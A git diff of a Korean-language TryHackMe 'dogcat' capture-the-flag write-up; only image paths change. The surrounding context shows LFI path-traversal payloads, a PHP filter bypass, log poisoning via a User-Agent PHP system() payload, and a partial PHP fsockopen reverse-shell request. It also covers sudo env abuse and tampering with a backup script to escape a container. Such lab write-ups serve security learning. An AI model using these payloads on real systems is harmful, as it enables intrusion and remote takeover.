@@ -48,14 +48,14 @@ Nmap done: 1 IP address (1 host up) scanned in 70.89 seconds
 - Web Service는 아파치 2.4.38 버전 사용인 걸로 확인
 - OpenSSH 7.6p1 으로 확인
 
-![그림 1-1](/assets/image/write-up/thm_dogcat/image.png)
+![그림 1-1](/assets/image/write-up/thm/thm_dogcat/image.png)
 - 웹 서비스 동작중이므로, 웹 사이트 접속 시도
 - a dog, a cat 버튼이 존재하며, 해당 버튼을 누르게되면 각 동물 사진이 출력됨.
 - 해당 페이지 소스에서는 하드코딩된 정보와 같은 유의미한 정보는 없음
 
 ### view 파라미터 발견 후 LFI 취약점 확인
 
-![그림 1-2](/assets/image/write-up/thm_dogcat/image-1.png)
+![그림 1-2](/assets/image/write-up/thm/thm_dogcat/image-1.png)
 - 해당 존재하는 버튼 클릭시 사진이 출력되며 URI 를 자세히 보게 되면
 - view 파라미터를 통해 페이지를 불러오는 듯 하다.
 - LFI 취약점 존재 유/무를 확인했다.
@@ -65,14 +65,14 @@ Nmap done: 1 IP address (1 host up) scanned in 70.89 seconds
 /?view=../../../../etc/passwd
 ```
 
-![그림 1-3](/assets/image/write-up/thm_dogcat/image-2.png)
+![그림 1-3](/assets/image/write-up/thm/thm_dogcat/image-2.png)
 - 파라미터의 인자값으로 dogs 혹은 cats만 가능하다고 한다.
 
 ```
 /?view=dog/../../../etc/passwd
 ```
 
-![그림 1-4](/assets/image/write-up/thm_dogcat/image-3.png)
+![그림 1-4](/assets/image/write-up/thm/thm_dogcat/image-3.png)
 - 이번에는 존재하지 않는다는 오류가 발생했으며
 - 이전 오류와는 다른 내용이다. 즉 dog 혹은 cat만 가능한 필터는 우회가 가능하다.
 - 출력되는 에러의 내용으로 추측해보면, 입력한 값에 확장자를 .php가 붙는듯 하다.
@@ -82,12 +82,12 @@ Nmap done: 1 IP address (1 host up) scanned in 70.89 seconds
 ```
 ### PHP Filter 우회를 통한 LFI 공격 후 Index 파일 소스 열람
 
-![그림 1-5](/assets/image/write-up/thm_dogcat/image-4.png)
+![그림 1-5](/assets/image/write-up/thm/thm_dogcat/image-4.png)
 - 경로순회를 하며 index 페이지를 찾았으며,
 - index 페이지가 존재하는 경로는 찾았으나, 파일이 열리지 않는다.
 - 이 떄 PHP Filter을 통해 우회를 시도했다.
 
-![그림 1-6](/assets/image/write-up/thm_dogcat/image-5.png)
+![그림 1-6](/assets/image/write-up/thm/thm_dogcat/image-5.png)
 - 성공적으로 base64 인코딩 값이 출력됨
 
 ```php
@@ -221,7 +221,7 @@ Connection: close
 
 ### User-Agent 값 변조를 통한 php system 함수 실행하여 Reverse Connection
 
-![그림 1-8](/assets/image/write-up/thm_dogcat/image-6.png)
+![그림 1-8](/assets/image/write-up/thm/thm_dogcat/image-6.png)
 - nc 를 통해 대기
 
 ```
@@ -232,19 +232,19 @@ GET /?view=dog/../../../../../var/log/apache2/access.log&cmd=php+-r+'$sock%3dfso
 User-Agent: <?php system($_GET['cmd']);?>
 ```
 
-![그림 1-8](/assets/image/write-up/thm_dogcat/image-7.png)
+![그림 1-8](/assets/image/write-up/thm/thm_dogcat/image-7.png)
 - 성공적으로 쉘을 획득 했다.
 
 
 ## 관리자 권한 획득
 
-![그림 1-9](/assets/image/write-up/thm_dogcat/image-10.png)
+![그림 1-9](/assets/image/write-up/thm/thm_dogcat/image-10.png)
 - sudo -l 을 통해 sudo 권한을 확인 
 - root 권한으로 패스웓 없으 env 명령어 사용이 가능하다.
 
 ### sudo 명령어에 대한 잘못된 권한 부여
 
-![그림 1-10](/assets/image/write-up/thm_dogcat/image-8.png)
+![그림 1-10](/assets/image/write-up/thm/thm_dogcat/image-8.png)
 - sudo의 잘못된 권한을 악용하여 root 쉘을 획득할 수 있다.
 
 
@@ -252,7 +252,7 @@ User-Agent: <?php system($_GET['cmd']);?>
 
 ### 컨테이너 root 획득 후 공유 디렉터리로 의심되는 경로에서 백업 스크립트 변조 후 탈출
 
-![그림 1-11](/assets/image/write-up/thm_dogcat/image-9.png)
+![그림 1-11](/assets/image/write-up/thm/thm_dogcat/image-9.png)
 - opt 경로 하위에 backup.sh가 존재하며 해당 스크립트를 보게되면
 - /root/container을 묶어 /root/container/backup/backup.tar로 아카이브한다.
 - 즉 현재 컨테이너 환경이며, 컨테이너 안에 존재하고 있다.
@@ -260,8 +260,8 @@ User-Agent: <?php system($_GET['cmd']);?>
 - 즉 정기적으로 해당 스크립트를 실행시킨다.
 - 즉 해당 파일 내에 Reverse shell을 얻기위한 코드를 삽입하면 호스트의 root쉘을 획득할 수 있다.
 
-![그림 1-12](/assets/image/write-up/thm_dogcat/image-11.png)
+![그림 1-12](/assets/image/write-up/thm/thm_dogcat/image-11.png)
 - 이와 같이 backup.sh 쉘 스크립트를 조작
 
-![그림 1-13](/assets/image/write-up/thm_dogcat/image-12.png)
+![그림 1-13](/assets/image/write-up/thm/thm_dogcat/image-12.png)
 - 포트개방 후 1~2분정도 소요 후 호스트의 root 권한을 획득할 수 있다.
